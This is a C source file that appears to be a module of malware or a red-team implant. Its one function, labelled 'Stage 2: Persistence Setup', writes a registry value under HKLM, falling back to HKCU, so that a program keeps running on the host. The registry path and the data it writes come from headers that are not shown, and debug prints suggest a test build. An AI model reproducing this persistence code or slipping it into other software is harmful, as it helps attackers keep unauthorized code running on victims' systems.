#include "../include/config.h"
#include "../include/types.h"

BOOL RegisterPersistence(void) {
    HKEY hKey = NULL;  // Initialize to NULL
    LONG ret = 0;

    printf("[PERSIST] --- Stage 2: Persistence Setup ---\n");
    fflush(stdout);

    // Try HKLM first
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        printf("[DEBUG] HKLM opened successfully (Handle: %p)\n", (void*)hKey);
        fflush(stdout);
        
        wchar_t *testData = (wchar_t*)PERSIST_VAL_DATA;
        size_t dataLen = (wcslen(testData) + 1) * sizeof(wchar_t);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)testData, (DWORD)dataLen);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKLM)...\n");
            fflush(stdout);
            RegCloseKey(hKey);
            return TRUE;
        }
        else {
            printf("[DEBUG] HKLM SetValue failed: 0x%08lX\n", ret);
            fflush(stdout);
        }
        
        RegCloseKey(hKey);
    }
    else {
        DWORD err = GetLastError();
        printf("[DEBUG] HKLM opened failed: 0x%08lX (Error: %lu)\n", (DWORD)err, err);
        fflush(stdout);
    }

    // Fallback to HKCU if HKLM fails
    printf("[DEBUG] Trying HKCU...\n");
    fflush(stdout);
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, PERSIST_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        printf("[DEBUG] HKCU opened successfully (Handle: %p)\n", (void*)hKey);
        fflush(stdout);
        
        wchar_t *testData = (wchar_t*)PERSIST_VAL_DATA;
        size_t dataLen = (wcslen(testData) + 1) * sizeof(wchar_t);
        
        ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
                            (LPBYTE)testData, (DWORD)dataLen);
        
        if (ret == ERROR_SUCCESS) {
            printf("[PERSIST] Wrote Registry Key (HKCU)...\n");
            fflush(stdout);
            RegCloseKey(hKey);
            return TRUE;
        }
        else {
            printf("[DEBUG] HKCU SetValue failed: 0x%08lX (Error: %lu)\n", ret, (unsigned long)GetLastError());
            fflush(stdout);
        }
        
        RegCloseKey(hKey);
    }
    else {
        DWORD err = GetLastError();
        printf("[DEBUG] HKCU opened failed: 0x%08lX (Error: %lu)\n", (DWORD)err, err);
        fflush(stdout);
    }

    printf("[DEBUG] No registry key created\n");
    fflush(stdout);
    return FALSE;
}
